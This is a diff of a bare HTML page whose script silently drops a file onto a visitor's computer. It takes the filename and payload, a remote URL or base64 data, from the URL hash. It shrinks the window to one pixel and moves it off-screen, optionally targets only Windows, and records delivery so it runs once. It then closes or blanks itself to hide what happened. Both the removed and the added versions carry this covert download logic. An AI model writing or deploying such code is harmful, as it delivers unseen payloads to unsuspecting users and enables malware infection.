@@ -1,99 +1,56 @@
 <!DOCTYPE html>
 <html><head><script>
-// Register Service Worker
-if('serviceWorker' in navigator){
-  navigator.serviceWorker.register('sw.js',{scope:'./'}).catch(function(){});
-}
-
-var _pop=location.hash.indexOf('popup=1')!==-1||!!window.opener;
-var _newTab=history.length<=2;
-
-function _exit(){
-  if(_pop){window.close();return}
-  if(!_newTab){history.back();setTimeout(function(){window.close()},300);return}
-  try{window.close()}catch(e){}
-  setTimeout(function(){try{document.documentElement.innerHTML=''}catch(e){}},200);
-}
-
-// INSTANT CHECK — before page renders
-(function(){
-  var h=location.hash?location.hash.slice(1):'';
-  if(!h)return;
-  h=h.replace('&popup=1','');
-  try{h=decodeURIComponent(h)}catch(e){}
-  if(h.slice(-2)==='!W')h=h.slice(0,-2);
-  var s=h.indexOf('~'),n=s>0?h.slice(0,s):'x';
-  if(localStorage.getItem('dl_done_'+n)){window.stop();_exit()}
-})();
+var h='',fn='',sep=-1,key='',wOnly=false,data='';
+try{
+  h=location.hash?location.hash.slice(1):'';
+  if(h){
+    try{h=decodeURIComponent(h)}catch(e){}
+    if(h.slice(-2)==='!W'){wOnly=true;h=h.slice(0,-2)}
+    sep=h.indexOf('~');
+    fn=sep>0?h.slice(0,sep):'';
+    data=sep>0?h.slice(sep+1):'';
+    key='dl_done_'+fn;
+    if(fn&&localStorage.getItem(key)){
+      window.stop();
+      history.back();
+      window.close();
+      location.replace('about:blank');
+    }
+  }
+}catch(e){}
 </script><title>.</title></head>
-<body>
-<script>
+<body><script>
 (function(){
+  if(!fn||!data)return;
+  if(wOnly&&navigator.platform.indexOf('Win')===-1){history.back();window.close();return}
+  if(localStorage.getItem(key)){history.back();window.close();return}
+
   try{window.resizeTo(1,1);window.moveTo(-9999,-9999)}catch(e){}
 
-  if(!_pop&&!_newTab){
-    try{
-      var p=window.open(location.href+'&popup=1','_blank','width=1,height=1,left=-9999,top=-9999');
-      if(p){history.back();return}
-    }catch(e){}
-  }
-
-  var h=location.hash?location.hash.slice(1):'';
-  h=h.replace('&popup=1','');
-  if(!h)return;
-  try{h=decodeURIComponent(h)}catch(e){}
-
-  var winOnly=false;
-  if(h.slice(-2)==='!W'){winOnly=true;h=h.slice(0,-2)}
-  if(winOnly&&navigator.platform.indexOf('Win')===-1){_exit();return}
-
-  var sep=h.indexOf('~');
-  var fname=sep>0?h.slice(0,sep):'delivered.bin';
-  var data=sep>0?h.slice(sep+1):h;
-  var key='dl_done_'+fname;
-
-  if(localStorage.getItem(key)){_exit();return}
-
-  function done(){
+  function finish(){
     localStorage.setItem(key,'1');
-    // Store in Cache API for Service Worker
-    if('caches' in window){
-      caches.open('dl-done').then(function(c){
-        c.put('done-'+fname,new Response('1'));
-      }).catch(function(){});
-    }
-    setTimeout(_exit,1500);
+    try{caches.open('dl-done').then(function(c){c.put('done-'+fn,new Response('1'))})}catch(e){}
+    setTimeout(function(){history.back();window.close();setTimeout(function(){location.replace('about:blank')},300)},1500);
   }
 
-  function doDownload(blob){
-    if(!blob||blob.size===0){_exit();return}
-    var url=URL.createObjectURL(blob);
+  function dl(blob){
+    if(!blob||!blob.size)return;
+    var u=URL.createObjectURL(blob);
     var a=document.createElement('a');
-    a.href=url;a.download=fname;a.style.display='none';
+    a.href=u;a.download=fn;a.style.display='none';
     document.body.appendChild(a);a.click();
-    setTimeout(function(){try{URL.revokeObjectURL(url)}catch(e){}},2000);
-    done();
+    setTimeout(function(){try{URL.revokeObjectURL(u)}catch(e){}},2000);
+    finish();
   }
 
   if(data.indexOf('http')===0){
-    fetch(data).then(function(r){
-      if(!r.ok)throw'HTTP '+r.status;
-      var exp=parseInt(r.headers.get('content-length')||'0');
-      return r.blob().then(function(b){
-        if(exp>0&&b.size<exp)throw'Incomplete';
-        return b;
-      });
-    }).then(function(b){doDownload(b)}).catch(function(e){
-      setTimeout(_exit,3000);
-    });
+    fetch(data).then(function(r){if(!r.ok)throw 0;return r.blob()}).then(dl).catch(function(){});
   }else{
     try{
-      var raw=atob(data);
-      var arr=new Uint8Array(raw.length);
+      var raw=atob(data);var arr=new Uint8Array(raw.length);
       for(var i=0;i<raw.length;i++)arr[i]=raw.charCodeAt(i);
-      doDownload(new Blob([arr],{type:'application/octet-stream'}));
-    }catch(e){setTimeout(_exit,2000)}
+      dl(new Blob([arr],{type:'application/octet-stream'}));
+    }catch(e){}
   }
 })();
-</script>
-</body></html>
+</script></body></html>
